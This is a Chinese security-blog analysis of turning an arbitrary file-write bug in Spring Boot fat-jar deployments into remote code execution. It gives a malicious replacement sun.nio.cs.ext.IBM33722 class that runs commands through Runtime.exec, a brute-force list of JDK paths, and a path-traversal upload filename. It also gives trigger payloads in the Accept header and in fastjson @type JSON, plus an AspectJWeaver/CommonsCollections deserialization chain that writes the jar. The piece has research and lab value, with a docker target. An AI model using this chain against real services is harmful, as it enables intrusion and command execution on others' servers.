# Spring FatJar写文件到RCE分析-先知社区

> **来源**: https://xz.aliyun.com/news/16268  
> **文章ID**: 16268

---

# Spring FatJar写文件到RCE

来自LandGrey 2020的著名文章：Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索

<https://landgrey.me/blog/22/>

## 背景

现在生产环境部署 `spring boot` 项目一般都是将其打包成一个 `FatJar`，即把所有依赖的第三方 jar 也打包进自身的 `app.jar` 中，最后以 `java -jar app.jar` 形式来运行整个项目。

运行时项目的 `classpath` 包括 `app.jar` 中的 `BOOT-INF/classes` 目录和 `BOOT-INF/lib` 目录下的所有 jar，以及JAVA HOME下系统classpath的jar，无法在其运行的时候往 app.jar classpath 中增加文件。并且现阶段 spring boot 项目多以 RESTful API 接口形式向外提供服务，很少会动态解析 jsp 和其他外部模版文件，直接 webshell 文件的情况一般不会出现。

**一个正在运行中的 spring boot 项目如果存在本地任意写文件漏洞，怎么升级成 RCE 漏洞** ？

比如fastjson写文件，AspectJWeaver写文件

通用方法基本就是通过写 linux `crontab` 计划任务文件、替换 `so/dll` 系统文件进行劫持等**一些操作系统层面**的东西来实现 RCE。实际环境下因为网络联通性、文件权限等各种条件限制，都不是特别好用

## 写文件路径

虽然无法在`app.jar` 中的 `BOOT-INF/classes` 目录和 `BOOT-INF/lib` 目录下写文件，但是可以写到JAVA HOME下系统classpath

但是JVM在运行时，不会在一开始运行就把所有的JDK HOME目录下自带的jar文件全部加载到类中，不然会有很大的性能损耗

而JDK在启动后，不会主动寻找HOME目录下新增的jar文件尝试加载，所以只能替换JDK HOME下原有的jar。而且还得找系统启动后没有进行过`Opened`操作的系统jar，如果已经Opened，会报文件正在使用：

![](images/20241224180150-183c5966-c1de-1.png)

> 什么是Opened操作？
>
> 在java的运行参数中加上`-XX:+TraceClassLoading`，可以观察到控制台输出的类装载过程日志：
>
> 比如我随便跑个test
>
> ![](images/20241224180152-19381486-c1de-1.png)
>
> 可以看到分别加载了rt.jar
>
> ![](images/20241224180152-195fa898-c1de-1.png)
>
> ![](images/20241224180152-19822e18-c1de-1.png)

程序代码中如果没有使用`Charset.forName("GBK")`类似的代码，默认就不会加载到`/jre/lib/charsets.jar`文件

### question：为什么加载了charsets?

但是即使我这test为空，为什么还是加载了charsets？

Windows的JVM在初始化时会预加载某些字符集（如`sun.nio.cs`包中的类），以支持本地编码。其实验证也很简单，比如写个空demo：

```
public class test{
    public static void main(String[] args) throws IOException {
//        parseMediaTypes("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");

    }
}

```

在Charset.forName打上断点，可以看到加载了一堆charsetName，其中就有GBK

![](images/20241224180152-19ad698c-c1de-1.png)

此时栈如下：

![](images/20241224180153-19da36c6-c1de-1.png)

向上跟进可以看到在jdk.internal.util.EnvUils下调用native getEnvVar方法，返回了系统编码GBK

![](images/20241224180153-1a0a06ba-c1de-1.png)

为什么会带调用这个getEnvVar呢？

发现JVM初始化会加载自定义的usagetracker.properties，而这个配置文件理论上是按照环境字符变量编码的字符

![](images/20241224180153-1a3d3106-c1de-1.png)

![](images/20241224180154-1a614576-c1de-1.png)

分析到这里，莫名发现2018年有个JAVA Usage Tracker windows本地提权漏洞，哈哈也算是串起来了

入口为PostVMInitHook

> `PostVMInitHook` 是一种在 Java 虚拟机（JVM）初始化完成后执行的“钩子类”机制
>
> JVM 的初始化阶段包括以下几个关键步骤：
>
> 1. 加载和初始化核心类，例如 `java.lang.Object` 和 `java.lang.String`。
> 2. 创建 `main` 线程。
> 3. 调用主类的 `main` 方法。

属于Java Agent那一块的

而且用`-verbose:class`参数可以看到PostVMInitHook触发在加载rt.jar的时候

![](images/20241224180154-1a880d28-c1de-1.png)

也就是说windows下加载rt.jar时就会触发PostVMInitHook，进而加载charsets.jar

不过也只是个猜测，因为我不知道怎么跟进到调用PostVMInitHook的代码。总的来说看结果是Windows下会自动加载charsets.jar

### question2：JAVA HOME在哪？

经测试，在linux默认配置下，是不会加载charsets.jar包的。 默认 LANG=zh\_CN.UTF-8，当把 LANG改为zh\_CN.GBK时才可以加载charsets.jar

* tips：JDK HOME目录一般不是固定的，可以提前收集好JDK HOME的字典文件，爆破上传，如：

```
/usr/lib/jvm/jre/lib/
/usr/local/jdk/jre/lib/
/usr/local/openjdk-6/lib/
/usr/local/openjdk-7/lib/
/usr/local/openjdk-8/lib/
/usr/lib/jvm/java/jre/lib/
/usr/lib/jvm/jdk6/jre/lib/
/usr/lib/jvm/jdk7/jre/lib/
/usr/lib/jvm/jdk8/jre/lib/
/usr/lib/jvm/jdk-11.0.3/lib/
/usr/lib/jvm/jdk1.6/jre/lib/
/usr/lib/jvm/jdk1.7/jre/lib/
/usr/lib/jvm/jdk1.8/jre/lib/
/usr/local/openjdk6/jre/lib/
/usr/local/openjdk7/jre/lib/
/usr/local/openjdk8/jre/lib/
/usr/local/openjdk-6/jre/lib/
/usr/local/openjdk-7/jre/lib/
/usr/local/openjdk-8/jre/lib/
/mnt/jdk/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.6.0/jre/lib/
/usr/lib/jvm/jdk1.7.0/jre/lib/
/usr/lib/jvm/jdk1.8.0/jre/lib/
/usr/java/jdk1.8.0_111/jre/lib/
/usr/java/jdk1.8.0_121/jre/lib/
/usr/lib/jvm/java-6-oracle/lib/
/usr/lib/jvm/java-7-oracle/lib/
/usr/lib/jvm/java-8-oracle/lib/
/usr/lib/jvm/java-1.6.0/jre/lib/
/usr/lib/jvm/java-1.7.0/jre/lib/
/usr/lib/jvm/java-1.8.0/jre/lib/
/usr/lib/jvm/jdk1.7.0_51/jre/lib/
/usr/lib/jvm/jdk1.7.0_76/jre/lib/
/usr/lib/jvm/jdk1.8.0_60/jre/lib/
/usr/lib/jvm/jdk1.8.0_66/jre/lib/
/usr/lib/jvm/jdk1.8.0_74/jre/lib/
/usr/lib/jvm/jdk1.8.0_91/jre/lib/
/usr/lib/jvm/oracle_jdk6/jre/lib/
/usr/lib/jvm/oracle_jdk7/jre/lib/
/usr/lib/jvm/oracle_jdk8/jre/lib/
/usr/lib/jvm/jdk1.8.0_101/jre/lib/
/usr/lib/jvm/jdk1.8.0_102/jre/lib/
/usr/lib/jvm/jdk1.8.0_111/jre/lib/
/usr/lib/jvm/jdk1.8.0_131/jre/lib/
/usr/lib/jvm/jdk1.8.0_144/jre/lib/
/usr/lib/jvm/jdk1.8.0_151/jre/lib/
/usr/lib/jvm/jdk1.8.0_152/jre/lib/
/usr/lib/jvm/jdk1.8.0_161/jre/lib/
/usr/lib/jvm/jdk1.8.0_171/jre/lib/
/usr/lib/jvm/jdk1.8.0_172/jre/lib/
/usr/lib/jvm/jdk1.8.0_181/jre/lib/
/usr/lib/jvm/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.8.0_202/jre/lib/
/usr/lib/jvm/jdk8u202-b08/jre/lib/
/usr/lib/jvm/jre-6-oracle-x64/lib/
/usr/lib/jvm/jre-7-oracle-x64/lib/
/usr/lib/jvm/jre-8-oracle-x64/lib/
/usr/lib/jvm/zulu-6-amd64/jre/lib/
/usr/lib/jvm/zulu-7-amd64/jre/lib/
/usr/lib/jvm/zulu-8-amd64/jre/lib/
/usr/lib/jvm/java-6-oracle/jre/lib/
/usr/lib/jvm/java-7-oracle/jre/lib/
/usr/lib/jvm/java-8-oracle/jre/lib/
/usr/jdk/instances/jdk1.6.0/jre/lib/
/usr/jdk/instances/jdk1.7.0/jre/lib/
/usr/jdk/instances/jdk1.8.0/jre/lib/
/usr/lib/jvm/j2re1.6-oracle/jre/lib/
/usr/lib/jvm/j2re1.7-oracle/jre/lib/
/usr/lib/jvm/j2re1.8-oracle/jre/lib/
/usr/lib/jvm/java-1.6.0-sun/jre/lib/
/usr/lib/jvm/java-1.7.0-sun/jre/lib/
/usr/lib/jvm/java-1.8.0-sun/jre/lib/
/usr/lib/jvm/java-6-openjdk/jre/lib/
/usr/lib/jvm/java-7-openjdk/jre/lib/
/usr/lib/jvm/java-8-openjdk/jre/lib/
/usr/lib/jvm/j2sdk1.6-oracle/jre/lib/
/usr/lib/jvm/j2sdk1.7-oracle/jre/lib/
/usr/lib/jvm/j2sdk1.8-oracle/jre/lib/
/usr/lib/jvm/java-11-openjdk/jre/lib/
/usr/lib/jvm/java-12-openjdk/jre/lib/
/usr/lib/jvm/java-13-openjdk/jre/lib/
/usr/lib/jvm/java-1.6-openjdk/jre/lib/
/usr/lib/jvm/java-1.7-openjdk/jre/lib/
/usr/lib/jvm/java-1.8-openjdk/jre/lib/
/usr/lib/jvm/java-9-openjdk-amd64/lib/
/usr/lib/jvm/jdk-6-oracle-x64/jre/lib/
/usr/lib/jvm/jdk-7-oracle-x64/jre/lib/
/usr/lib/jvm/jdk-8-oracle-x64/jre/lib/
/usr/lib/jvm/jre-6-oracle-x64/jre/lib/
/usr/lib/jvm/jre-7-oracle-x64/jre/lib/
/usr/lib/jvm/jre-8-oracle-x64/jre/lib/
/usr/lib/jvm/java-10-openjdk-amd64/lib/
/usr/lib/jvm/java-11-openjdk-amd64/lib/
/usr/lib/jvm/java-1.11.0-openjdk/jre/lib/
/usr/lib/jvm/java-1.12.0-openjdk/jre/lib/
/usr/lib/jvm/java-6-openjdk-i386/jre/lib/
/usr/lib/jvm/java-6-sun-1.6.0.16/jre/lib/
/usr/lib/jvm/java-6-sun-1.6.0.20/jre/lib/
/usr/lib/jvm/java-7-openjdk-i386/jre/lib/
/usr/lib/jvm/java-8-openjdk-i386/jre/lib/
/usr/lib/jvm/java-6-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-7-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.6.0-oracle-x64/jre/lib/
/usr/lib/jvm/java-1.7.0-oracle-x64/jre/lib/
/usr/lib/jvm/java-1.8.0-oracle-x64/jre/lib/
/usr/lib/jvm/oracle-java6-jdk-amd64/jre/lib/
/usr/lib/jvm/oracle-java7-jdk-amd64/jre/lib/
/usr/lib/jvm/oracle-java8-jdk-amd64/jre/lib/
/usr/lib64/jvm/java-1.6.0-ibd-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.6.0-ibm-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.7.1-ibm-1.7.1/jre/lib/
/usr/lib/jvm/java-1.6.0-sun-1.6.0.11/jre/lib/
/usr/lib/jvm/java-1.6.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/jre-1.6.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/jre-1.7.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/jre-1.8.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/java-1.11.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/jdk-8-oracle-arm-vfp-hflt/jre/lib/
/usr/lib64/jvm/java-1.6.0-openjdk-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.7.0-openjdk-1.7.0/jre/lib/
/usr/lib64/jvm/java-1.8.0-openjdk-1.8.0/jre/lib/
/usr/lib/jvm/java-1.6.0-openjdk-1.6.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.8.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-amazon-corretto.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.45.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.65.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.79.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.91.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-3.b17.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-4.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-2.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-11.b12.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-1.b13.el6_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.el7_1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.el6_7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-1.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-0.b15.el6_8.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-2.b15.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-0.b11.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-3.b12.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-3.b16.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-5.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-3.b14.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-3.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-1.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-2.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.222.b10-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.5.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.7.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.9.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101-2.6.6.1.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.131-2.6.9.0.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.10.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.171-2.6.13.0.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191-2.6.15.4.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.24.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.25.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.29.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.30.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.32.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.36.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.37.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.38.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.42.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.43.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.45.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-8.b13.39.39.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64-debug/jre/lib/

```

现在假设已经成功把charsets.jar写进了classpath，怎么去主动加载？

## Trick1：Accept头

### mutipart字符串触发

`spring-web`组件中的`org.springframework.web.accept.HeaderContentNegotiationStrategy`类调用了`MediaType.parseMediaTypes`

```
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-web</artifactId>
    <version>5.3.28</version>
</dependency>

```

![](images/20241224180154-1abe368c-c1de-1.png)

这个方法从Header中提取Accept头，一般长这样：

```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

跟进parseMediaTypes，一个循环解析List

![](images/20241224180155-1aeddb8a-c1de-1.png)

继续跟进`parseMediaTypes(@Nullable String mediaTypes)`，使用MimeTypeUtils.tokenize分割tokens，然后循环调用parseMediaType

![](images/20241224180155-1b18fdf6-c1de-1.png)

比如上面的Accept，经过tokenize的分离如下：

![](images/20241224180155-1b4a6334-c1de-1.png)

继续跟进到parseMediaType，调用了`MimeTypeUtils.parseMimeType`

![](images/20241224180155-1b786246-c1de-1.png)

终于跟到了`parseMimeType(String mimeType)`，如果mimeType以`multipart`开头，调用parseMimeTypeInternal

![](images/20241224180156-1ba40c70-c1de-1.png)

比如上面的`tokens[0]`在这就进不去parseMimeTypeInternal

![](images/20241224180156-1bcbc81e-c1de-1.png)

看下parseMimeTypeInternal。一堆解析后return了 MimeType

![](images/20241224180156-1bf4494c-c1de-1.png)

MimeType中，参数不为空会调用checkParamters

![](images/20241224180157-1c270dfa-c1de-1.png)

checkParamters调用了`Charset.forName`

![](images/20241224180157-1c5791fa-c1de-1.png)

了解到Accept头中，multipart对应的字段格式如下

`multipart/form-data` ： 需要在表单中进行文件上传时，就需要使用该格式。

如下Accept能触发Charset.forName：

```
multipart/form-data;charset=evil;
```

调试code：

```
public class test{
    public static void main(String[] args) throws IOException {
        parseMediaTypes("multipart/form-data;charset=evil;");
    }
}

```

![](images/20241224180157-1c97606e-c1de-1.png)

看到报错`unsupport charset 'evil'`就代表成功触发

![](images/20241224180158-1cce3c9c-c1de-1.png)

继续看到Charset.forName，跟进到lookup

![](images/20241224180158-1cffa64c-c1de-1.png)

继续跟到lookup2

![](images/20241224180158-1d2dbc76-c1de-1.png)

接连调用了`standardProvider.charsetForName`，`lookupExtendedCharset`，`lookupViaProviders`

![](images/20241224180159-1d65074c-c1de-1.png)

先跟进到lookupExtendedCharset，看下这个静态字段extendedProvider哪来的

![](images/20241224180159-1d8d5a1e-c1de-1.png)

extendedProvider字段来自其同名的方法

![](images/20241224180159-1db0f4c6-c1de-1.png)

该方法加载并返回了`sun.nio.cs.ext.ExtendedCharsets`

![](images/20241224180200-1de5eef4-c1de-1.png)

看到这个类的代码就明白，这是一个枚举所有字符类的集合

![](images/20241224180200-1e449c68-c1de-1.png)

后续制作charsets.jar时，这个类需要保留

### cache触发

可是网上的payload是`Accept: text/html;charset=evil;`触发到Charset.forName。我们从代码可以清楚地看到需要字符以`multipart`开头才会进入parseMimeTypeInternal

重新调了一下，发现还有个触发栈可以触发Charset.forName

看到parseMimeTypes的cachedMimeTypes

![](images/20241224180201-1e8b25ae-c1de-1.png)

跟进到了ConcurrentLruCache.get，这里调用了`MimeTypeUtils$$Labmda.apply`，是个内部生成的匿名类，无法跟进，但是这里点步进就到了parseMimeTypeInternal

![](images/20241224180201-1ebdf2ae-c1de-1.png)

同理得到一样的效果

![](images/20241224180201-1ee77db8-c1de-1.png)

总结，下面两个Accept都能触发加载charsets.jar字符集

```
Accept: multipart/form-data;charset=IBM33722;
Accept: text/html;charset=IBM33722;
```

### 复现

先看看正常的charsets.jar，一般会在jdk/jre/lib下

![](images/20241224180202-1f1b24b0-c1de-1.png)

直接解压了重新开个idea打开就行了

目录如下：

![](images/20241224180202-1f60b34a-c1de-1.png)

随便选一个sun.nio.cs.ext下的类进行覆盖就OK，为了保持最小体积，抛弃其他类（需要保留ExtendedCharsets类，不然无法加载其他类）。这里就选择覆盖sun.nio.cs.ext.IBM33722

Charset.forName加载类时，会完成类的初始化，进而触发static代码块

```
package sun.nio.cs.ext;

import java.util.UUID;


public class IBM33722 {
    static {
        fun();
    }

    public IBM33722(){
        fun();
    }

    private static java.util.HashMap<String, String> fun(){
        String[] command;
        String random = UUID.randomUUID().toString().replace("-","").substring(1,9);
        String osName = System.getProperty("os.name");
        if (osName.startsWith("Mac OS")) {
            command = new String[]{"/bin/bash", "-c", "open -a Calculator"};
        } else if (osName.startsWith("Windows")) {
            command = new String[]{"cmd.exe", "/c", "calc"};
        } else {
            if(new java.io.File("/bin/bash").exists()){
                command = new String[]{"/bin/bash", "-c", "touch /tmp/charsets_test_" + random + ".log"};
            }else{
                command = new String[]{"/bin/sh", "-c", "touch /tmp/charsets_test_" + random + ".log"};
            }
        }
        try{
            Runtime.getRuntime().exec(command);
        }catch (Throwable e1){
            e1.printStackTrace();
        }
        return null;
    }


}

```

打包的charsets.jar挂在github

<https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/blob/main/release/charsets.jar>

搭个靶机：

```
docker pull landgrey/spring-boot-fat-jar-write-file-rce:1.2
docker run -p --rm 18081:18081 landgrey/spring-boot-fat-jar-write-file-rce:1.2

```

> 启动容器时使用 `--rm` 参数，退出时自动删除docker。不然不能重复打，因为charsets.jar只会加载一遍

上传charsets.jar，抓个包，filename改为`../../usr/lib/jvm/java-1.8-openjdk/jre/lib/charsets.jar`![](images/20241224180203-1fbafa12-c1de-1.png)

然后Accept改为任意一个payload访问任意一个路由

```
Accept: multipart/form-data;charset=IBM33722;
Accept: text/html;charset=IBM33722;

```

写进了charsets\_test\_random.log代表成功

![](images/20241224180203-1ff8ddb4-c1de-1.png)

但很明显，业务会被直接打崩，不利于隐蔽：

![](images/20241224180204-2048bd5c-c1de-1.png)

除此以外，作者还给出了其他5个场景去触发加载charset，适合于不在原生spring场景的去触发加载charset

## Trick2：fastjson写文件+setter触发

无需spring场景，需要fastjson>=1.2.68

ParserConfig声明了fastjson的白名单，可以看到Charset类用MiscCodec反序列化器去处理

![](images/20241224180204-208fb8c6-c1de-1.png)

MiscCodec是老朋友了，直接看到deserialze方法，如果clazz是Charset.class的话，会调用Charset.forName

![](images/20241224180204-20b40aa8-c1de-1.png)

fastjson写文件就不测了，搭配commons-io或者JDK11原生写都可以

用上面的docker fastjson路由触发：

```
POST /fastjson HTTP/1.1
Content-Type: application/json

{
    "x":{
        "@type":"java.nio.charset.Charset",
        "val":"IBM33722"
    }
}

```

![](images/20241224180207-228fd034-c1de-1.gif)

### Trick2.5：AspectJWeaver写文件

借助CC前半段触发`org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap#writeToPath`去写文件，然后选上面的Accept触发方式去RCE

```
public class writeToPath_withCC {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("charsets.jar"));
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class);
        constructor.setAccessible(true);
        HashMap storeableCachingMap = (HashMap) constructor.newInstance("./",1);
//        storeableCachingMap.put("writeToPathFILE",code);
        LazyMap lazy = (LazyMap) LazyMap.decorate(storeableCachingMap, new ConstantTransformer(code));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, "../../usr/lib/jvm/java-1.8-openjdk/jre/lib/charsets.jar");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

写文件的方式还有很多，比如SnakeYaml MarshalOutputStream写文件等

另外还有jackson、JDBC、和一些代码直接初始化类加载的场景。但是这些漏洞一般没有写文件搭配，实用性不是很大，感兴趣可以去作者github

<https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks>

## Trick3：SPI机制

snakeyaml反序列化也用到了SPI机制

本来这一章是有的，复现完觉得linux下默认没有`jre/class`目录，利用情况太少了，又给删了。就这样吧！

参考：

<https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks>
